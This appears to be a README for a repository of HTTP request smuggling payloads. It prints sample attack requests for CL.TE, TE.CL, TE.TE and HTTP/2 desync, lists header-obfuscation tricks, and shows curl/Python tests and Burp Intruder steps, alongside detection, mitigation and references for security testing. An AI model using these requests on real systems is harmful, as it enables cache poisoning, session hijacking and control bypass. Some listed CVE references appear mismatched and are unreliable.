# HTTP Request Smuggling Payloads

<div align="center">
  
![HTTP Request Smuggling](https://img.shields.io/badge/Security-HTTP%20Request%20Smuggling-red)
![Payloads](https://img.shields.io/badge/Payloads-732+-blue)
![Burp Suite](https://img.shields.io/badge/Tool-Burp%20Suite-orange)
![License](https://img.shields.io/badge/License-MIT-green)

**A comprehensive collection of HTTP Request Smuggling payloads for security testing and research.**

[About](#about) • [Vulnerability Types](#vulnerability-types) • [Payload Categories](#payload-categories) • [Usage](#usage) • [References](#references)

</div>

---

## 📋 Table of Contents

- [About](#about)
- [What is HTTP Request Smuggling?](#what-is-http-request-smuggling)
- [Vulnerability Types](#vulnerability-types)
- [Payload Categories](#payload-categories)
- [Installation](#installation)
- [Usage](#usage)
- [Burp Suite Integration](#burp-suite-integration)
- [Testing Methodology](#testing-methodology)
- [Detection Techniques](#detection-techniques)
- [Mitigation](#mitigation)
- [Contributing](#contributing)
- [Disclaimer](#disclaimer)
- [References](#references)
- [License](#license)

---

## 📖 About

This repository contains a comprehensive collection of **HTTP Request Smuggling** payloads designed for security testing, penetration testing, and vulnerability research. All payloads are organized in categories and ready to be used with **Burp Suite Intruder** and other security testing tools.

### Features

✅ **732+ Unique Payloads** - Extensive collection covering all major techniques
✅ **Categorized & Organized** - Easy to find the right payload for your test case  
✅ **Burp Suite Ready** - Pre-formatted for Intruder attacks  
✅ **HTTP/1.1 & HTTP/2** - Support for both protocol versions  
✅ **Real-world Examples** - Based on actual vulnerabilities and research  
✅ **Regular Updates** - Continuously updated with new techniques  

---

## 🔍 What is HTTP Request Smuggling?

**HTTP Request Smuggling** is a critical web security vulnerability that exploits inconsistencies in how front-end and back-end servers parse HTTP request boundaries. When the front-end server (like a proxy, load balancer, or CDN) and back-end server disagree on where one request ends and another begins, attackers can:

- **Bypass security controls** (WAFs, authentication, access controls)
- **Poison web caches** with malicious content
- **Hijack user sessions** and credentials
- **Execute stored XSS** attacks
- **Gain unauthorized access** to internal systems

### How it Works

```
Client → Front-End Server → Back-End Server
```

1. Attacker sends an ambiguous HTTP request
2. Front-end interprets it as **one request**
3. Back-end interprets it as **two requests**
4. Second request gets prepended to the next legitimate user's request
5. Attacker can manipulate other users' requests

---

## 🎯 Vulnerability Types

### 1. **CL.TE (Content-Length / Transfer-Encoding)**

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`

**Attack Vector:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### 2. **TE.CL (Transfer-Encoding / Content-Length)**

Front-end uses `Transfer-Encoding: chunked`, back-end uses `Content-Length`

**Attack Vector:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

5c
GPOST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 15

x=1
0
```

### 3. **TE.TE (Transfer-Encoding / Transfer-Encoding)**

Both servers support `Transfer-Encoding`, but can be tricked with obfuscation

**Attack Vector:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

GET /404 HTTP/1.1
X: Y
```

**Common Obfuscation Techniques:**
- `Transfer-Encoding: chunked` (extra space)
- `Transfer-encoding: chunked` (case variation)
- `Transfer-Encoding : chunked` (space before colon)
- `Transfer-Encoding: chunked ` (trailing space)
- `Transfer-Encoding:[tab]chunked` (tab character)
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding: chunked, identity`

### 4. **HTTP/2 Desync**

HTTP/2 to HTTP/1.1 downgrade vulnerabilities

**Attack Vector:**
```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
```

---

## 📦 Payload Categories

### Detection & Basic Testing
- **File:** `Intruder/Detection-Payloads.txt`
- **Description:** Basic payloads for detecting request smuggling vulnerabilities
- **Use Case:** Initial reconnaissance and vulnerability confirmation

### CL.TE Exploitation
- **File:** `Intruder/CL-TE-Payloads.txt`
- **Description:** Payloads targeting CL.TE vulnerabilities
- **Use Case:** Front-end uses Content-Length, back-end uses Transfer-Encoding

### TE.CL Exploitation
- **File:** `Intruder/TE-CL-Payloads.txt`
- **Description:** Payloads targeting TE.CL vulnerabilities
- **Use Case:** Front-end uses Transfer-Encoding, back-end uses Content-Length

### TE.TE Exploitation
- **File:** `Intruder/TE-TE-Payloads.txt`
- **Description:** Obfuscated Transfer-Encoding headers
- **Use Case:** Both servers process Transfer-Encoding differently

### Cache Poisoning
- **File:** `Intruder/Cache-Poisoning-Payloads.txt`
- **Description:** Payloads for web cache poisoning attacks
- **Use Case:** Poisoning CDN/proxy caches with malicious responses

### Session Hijacking
- **File:** `Intruder/Session-Hijacking-Payloads.txt`
- **Description:** Payloads for capturing/hijacking user sessions
- **Use Case:** Stealing authentication tokens and session data

### Bypass & Privilege Escalation
- **File:** `Intruder/Bypass-Payloads.txt`
- **Description:** Payloads for bypassing security controls
- **Use Case:** Accessing restricted endpoints, bypassing WAF/authentication

### HTTP/2 Specific
- **File:** `Intruder/HTTP2-Desync-Payloads.txt`
- **Description:** HTTP/2 downgrade and desynchronization attacks
- **Use Case:** HTTP/2 to HTTP/1.1 conversion vulnerabilities

### Advanced Techniques
- **File:** `Intruder/Advanced-Payloads.txt`
- **Description:** Complex multi-stage attacks and edge cases
- **Use Case:** Advanced exploitation scenarios

### Time-based Detection
- **File:** `Intruder/Time-Based-Payloads.txt`
- **Description:** Time-delay based detection techniques
- **Use Case:** Blind detection when no direct feedback is available

---

## 🚀 Installation

### Clone the Repository

```bash
git clone https://github.com/payload-box/http-request-smuggling-payloads.git
cd http-request-smuggling-payloads
```

### Download Specific Payload Files

```bash
# Download all Intruder payloads
cd Intruder/

# Or download specific categories
wget https://raw.githubusercontent.com/payload-box/http-request-smuggling-payloads/main/Intruder/CL-TE-Payloads.txt
```

---

## 💻 Usage

### Basic Testing Flow

1. **Detection Phase** - Use `Detection-Payloads.txt` to identify vulnerability
2. **Vulnerability Type Identification** - Determine CL.TE, TE.CL, or TE.TE
3. **Exploitation** - Use category-specific payloads
4. **Impact Analysis** - Test cache poisoning, session hijacking, etc.

### Manual Testing Example

```bash
# Using curl
curl -X POST https://target.com/ \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nX"

# Using Python
import requests

headers = {
    'Content-Length': '6',
    'Transfer-Encoding': 'chunked'
}

data = "0\r\n\r\nX"

response = requests.post('https://target.com/', headers=headers, data=data)
```

---

## 🎯 Burp Suite Integration

### Method 1: Intruder Attack

1. **Open Burp Suite** and capture a request
2. **Send to Intruder** (Ctrl+I)
3. **Configure Attack Type:**
   - Type: `Sniper` or `Battering Ram`
   - Position: Select the entire request body or specific headers

4. **Load Payloads:**
   - Go to **Payloads** tab
   - Payload type: `Simple list`
   - Click **Load** → Select payload file (e.g., `CL-TE-Payloads.txt`)

5. **Configure Options:**
   - **Redirections:** Never follow redirections
   - **Grep:** Add patterns to detect successful smuggling:
     - `404 Not Found`
     - `Unrecognized method`
     - Response time anomalies

6. **Start Attack** and analyze responses

### Method 2: Repeater Testing

1. **Send request to Repeater** (Ctrl+R)
2. **Manually paste** payloads from files
3. **Send twice** to test if second request is affected
4. **Observe differences** in response times, status codes, headers

### Method 3: Extensions

Use specialized Burp extensions:
- **HTTP Request Smuggler** by PortSwigger
- **Turbo Intruder** for timing-based attacks
- **Logger++** for detailed analysis

---

## 🧪 Testing Methodology

### Step 1: Reconnaissance

```
✓ Identify architecture (proxy/load balancer + backend)
✓ Determine HTTP version support (HTTP/1.1, HTTP/2)
✓ Check for Connection: keep-alive support
✓ Test if multiple requests can be pipelined
```

### Step 2: Detection

**Technique 1: Time-based Detection**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
Q
```

Send this twice. If second request delays, smuggling is possible.

**Technique 2: Differential Responses**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

If you get a 404 response, smuggling succeeded.

### Step 3: Exploitation

Select appropriate payload category based on detection results:
- **CL.TE** → Use `CL-TE-Payloads.txt`
- **TE.CL** → Use `TE-CL-Payloads.txt`
- **TE.TE** → Use `TE-TE-Payloads.txt`

### Step 4: Impact Demonstration

Test for:
- ✓ Bypassing front-end security controls
- ✓ Cache poisoning (CDN/proxy)
- ✓ Session hijacking
- ✓ Request routing manipulation
- ✓ Internal endpoint access

---

## 🔎 Detection Techniques

### 1. **Timing-Based Detection**

Send a payload with a timeout and measure response time:
```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

1
A
Q
```

**Indicators:**
- Second request delays by ~30 seconds
- Backend waits for remaining data

### 2. **Differential Responses**

Inject a request to non-existent resource:
```http
0

GET /doesnotexist HTTP/1.1
Foo: bar
```

**Indicators:**
- 404 response received
- Different status code than normal

### 3. **Header Reflection**

Inject custom headers and check reflection:
```http
0

GET / HTTP/1.1
X-Smuggled-Header: test
```

**Indicators:**
- Custom header appears in logs
- Header reflected in response

### 4. **Connection Behavior**

Monitor connection behavior:
- Unexpected connection resets
- Connection kept alive when it shouldn't be
- Multiple responses for single request

---

## 🛡️ Mitigation

### For Developers

1. **Disable HTTP/1.1 keep-alive** on backend servers
2. **Normalize requests** - ensure front-end and back-end parse identically
3. **Reject ambiguous requests** - requests with both CL and TE
4. **Use HTTP/2** end-to-end (avoid downgrade)
5. **Update servers** to latest versions with fixes
6. **Strict parsing** - reject malformed requests

### For System Administrators

1. **Configuration Review:**
   ```nginx
   # Nginx - Disable HTTP/1.1 pipelining
   keepalive_requests 1;
   keepalive_timeout 0;
   
   # Apache - Disable keep-alive
   KeepAlive Off
   ```

2. **Deploy WAF rules** to detect smuggling patterns
3. **Monitor logs** for suspicious patterns:
   - Malformed Content-Length
   - Multiple Transfer-Encoding headers
   - Unusual chunk sizes

4. **Network segmentation** - isolate front-end and back-end

### Testing Your Defenses

Run detection payloads against your infrastructure:
```bash
# Test with detection payloads
python smuggler.py -u https://your-site.com
```

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/new-payloads`)
3. **Add** your payloads with proper categorization
4. **Test** payloads in a controlled environment
5. **Commit** changes (`git commit -am 'Add new CL.TE payloads'`)
6. **Push** to branch (`git push origin feature/new-payloads`)
7. **Create** a Pull Request

### Payload Submission Guidelines

- ✓ Test payloads before submitting
- ✓ Add description/comments for complex payloads
- ✓ Categorize correctly
- ✓ Follow existing format
- ✓ Avoid duplicates

---

## ⚠️ Disclaimer

**IMPORTANT LEGAL NOTICE**

This repository is intended for:
- ✓ **Authorized security testing** with explicit permission
- ✓ **Educational purposes** and security research
- ✓ **Bug bounty programs** within scope
- ✓ **Defensive security** and protection

**DO NOT:**
- ✗ Use against systems without authorization
- ✗ Use for illegal activities
- ✗ Use to cause harm or disruption

**Legal Warning:** Unauthorized access to computer systems is illegal under laws such as:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK  
- Cybercrime laws in various jurisdictions

The authors and contributors are **NOT responsible** for any misuse or damage caused by this repository. Users are solely responsible for ensuring their testing activities are legal and authorized.

**By using this repository, you agree to:**
1. Obtain proper authorization before testing
2. Comply with all applicable laws and regulations
3. Use responsibly and ethically
4. Take full responsibility for your actions

---

## 📚 References

### Research Papers & Articles

- [HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) - James Kettle
- [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2) - James Kettle  
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks) - James Kettle
- [Practical HTTP Header Smuggling](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers)

### Tools

- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner
- [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - Burp extension
- [Smuggler.py](https://github.com/defparam/smuggler) - Python-based testing tool
- [h2csmuggler](https://github.com/BishopFox/h2csmuggler) - HTTP/2 smuggling tool

### CVE References

- CVE-2020-11724 - Nginx
- CVE-2020-5902 - F5 BIG-IP
- CVE-2019-16254 - Puma web server
- CVE-2019-9516 - HTTP/2 implementation issues

### Standards & Specifications

- [RFC 7230](https://tools.ietf.org/html/rfc7230) - HTTP/1.1 Message Syntax and Routing
- [RFC 7540](https://tools.ietf.org/html/rfc7540) - HTTP/2 Specification
- [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112.html) - HTTP/1.1 (Updated 2022)

### Learning Resources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/request-smuggling)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackerOne Reports](https://hackerone.com/reports?keyword=request+smuggling)
- [PentesterLab](https://pentesterlab.com/) - Request Smuggling exercises

---

## 📊 Statistics

| Category | Payloads | Last Updated |
|----------|----------|--------------|
| Detection | 59 | 2026 |
| CL.TE | 102 | 2026 |
| TE.CL | 134 | 2026 |
| TE.TE | 134 | 2026 |
| Cache Poisoning | 20 | 2026 |
| Session Hijacking | 52 | 2026 |
| Bypass | 72 | 2026 |
| HTTP/2 | 55 | 2026 |
| Advanced | 64 | 2026 |
| Time-based | 40 | 2026 |
| **TOTAL** | **732+** | **2026** |

---

## 📞 Contact & Support

- **Issues:** [GitHub Issues](https://github.com/payload-box/http-request-smuggling-payloads/issues)
- **Discussions:** [GitHub Discussions](https://github.com/payload-box/http-request-smuggling-payloads/discussions)
- **Security:** Report vulnerabilities responsibly

---

## 📜 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2026 Payload Box

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
```

---

## ⭐ Star History

If you find this repository useful, please consider giving it a star! ⭐

[![Star History](https://img.shields.io/github/stars/payload-box/http-request-smuggling-payloads?style=social)](https://github.com/payload-box/http-request-smuggling-payloads/stargazers)

---

<div align="center">

**Made with ❤️ by security researchers, for security researchers**

[⬆ Back to Top](#http-request-smuggling-payloads)

</div>